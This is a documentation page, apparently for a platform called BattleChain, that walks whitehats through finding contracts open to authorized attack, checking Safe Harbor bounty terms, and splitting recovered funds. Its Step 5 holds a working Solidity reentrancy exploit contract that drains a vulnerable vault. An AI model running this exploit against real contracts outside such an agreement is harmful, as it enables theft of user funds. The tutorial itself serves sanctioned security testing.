@@ -1,0 +1,177 @@
+---
+title: "Execute Your First Attack"
+description: "A step-by-step tutorial to find and attack your first contract on BattleChain"
+---
+
+This tutorial walks you through finding an attackable contract, verifying its Safe Harbor terms, and executing a legal attack. By the end, you'll understand the complete whitehat workflow.
+
+<Note>
+
+**Prerequisites**: Familiarity with smart contract security and Solidity.
+
+</Note>
+
+## What You'll Do
+
+1. Find an attackable contract
+2. Review the Safe Harbor agreement
+3. Execute an attack
+4. Handle recovered funds correctly
+
+## Step 1: Find an Attackable Contract
+
+Query the `AttackRegistry` to check if a contract is attackable:
+
+```solidity
+// Check if a specific contract is in attack mode
+bool isAttackable = attackRegistry.isTopLevelContractUnderAttack(targetContract);
+
+if (isAttackable) {
+    // This contract can be legally attacked under Safe Harbor
+}
+```
+
+To find contracts to attack, monitor for `AgreementStateChanged` events:
+
+```solidity
+event AgreementStateChanged(address indexed agreementAddress, ContractState newState);
+
+// newState = 3 (UNDER_ATTACK) means contracts are attackable
+// newState = 4 (PROMOTION_REQUESTED) means still attackable during 3-day delay
+```
+
+## Step 2: Get the Agreement Details
+
+Once you find an attackable contract, get its agreement:
+
+```solidity
+// Get the agreement for this contract
+address agreementAddr = attackRegistry.getAgreementForContract(targetContract);
+
+// Get agreement details
+IAgreement agreement = IAgreement(agreementAddr);
+AgreementDetails memory details = agreement.getDetails();
+
+// Check bounty terms
+BountyTerms memory terms = details.bountyTerms;
+uint256 bountyPercent = terms.bountyPercentage;  // e.g., 10 for 10%
+uint256 bountyCap = terms.bountyCapUsd;          // e.g., 5_000_000 for $5M
+bool canRetain = terms.retainable;                // Can you keep from recovered funds?
+```
+
+<Check>
+You now know the bounty terms. In this example: 10% bounty, \$5M cap, retainable.
+</Check>
+
+## Step 3: Verify the Contract is in Scope
+
+Double-check the contract is covered:
+
+```solidity
+// Verify contract is in the agreement's scope
+bool inScope = agreement.isContractInScope(targetContract);
+require(inScope, "Contract not in scope - no Safe Harbor protection!");
+
+// Verify agreement is valid (created by official factory)
+bool validAgreement = safeHarborRegistry.isAgreementValid(agreementAddr);
+require(validAgreement, "Invalid agreement!");
+```
+
+## Step 4: Get the Recovery Address
+
+Note where to send recovered funds:
+
+```solidity
+// Get the asset recovery address for BattleChain
+string memory recoveryAddrStr = agreement.getAssetRecoveryAddress("eip155:325");
+// Parse to address (you'll need a helper for this)
+address recoveryAddress = parseAddress(recoveryAddrStr);
+```
+
+## Step 5: Execute Your Attack
+
+Now execute your exploit. Here's an example attacking a reentrancy vulnerability:
+
+```solidity
+contract Attacker {
+    IVulnerableVault public target;
+    address public recoveryAddress;
+    uint256 public bountyPercent;
+
+    constructor(address _target, address _recovery, uint256 _bountyPercent) {
+        target = IVulnerableVault(_target);
+        recoveryAddress = _recovery;
+        bountyPercent = _bountyPercent;
+    }
+
+    function attack() external payable {
+        // Deposit to set up the attack
+        target.deposit{value: msg.value}();
+        // Trigger the vulnerable withdraw
+        target.withdraw(msg.value);
+    }
+
+    receive() external payable {
+        // Reentrancy exploit
+        if (address(target).balance >= 1 ether) {
+            target.withdraw(1 ether);
+        }
+    }
+
+    function handleRecoveredFunds() external {
+        uint256 total = address(this).balance;
+
+        // Calculate bounty (e.g., 10%)
+        uint256 bounty = (total * bountyPercent) / 100;
+
+        // Send remainder to recovery address
+        uint256 toReturn = total - bounty;
+        payable(recoveryAddress).transfer(toReturn);
+
+        // Keep your bounty
+        payable(msg.sender).transfer(bounty);
+    }
+}
+```
+
+## Step 6: Handle Funds Correctly
+
+After a successful attack:
+
+<Steps>
+  <Step title="Calculate Your Bounty">
+    ```
+    Bounty = min(RecoveredAmount x BountyPercentage%, BountyCapUsd)
+    ```
+  </Step>
+  <Step title="Send Remainder to Recovery">
+    Transfer `RecoveredAmount - Bounty` to the recovery address
+  </Step>
+  <Step title="Keep Your Bounty">
+    The remaining amount is yours
+  </Step>
+</Steps>
+
+<Check>
+You've completed your first attack! The protocol received their funds (minus your bounty), and you're protected under Safe Harbor.
+</Check>
+
+## Step 7: Document Everything
+
+Keep records of:
+- The contract you attacked
+- The vulnerability exploited
+- Transaction hashes
+- Your bounty calculation
+- Funds sent to recovery
+
+## What's Next?
+
+<CardGroup cols={2}>
+  <Card title="How to Claim Bounties" icon="coins" href="/battlechain/how-to/claim-bounties">
+    Learn more about bounty calculations and caps
+  </Card>
+  <Card title="Safe Harbor Protection" icon="shield" href="/battlechain/explanation/safe-harbor">
+    Understand your legal protections
+  </Card>
+</CardGroup>
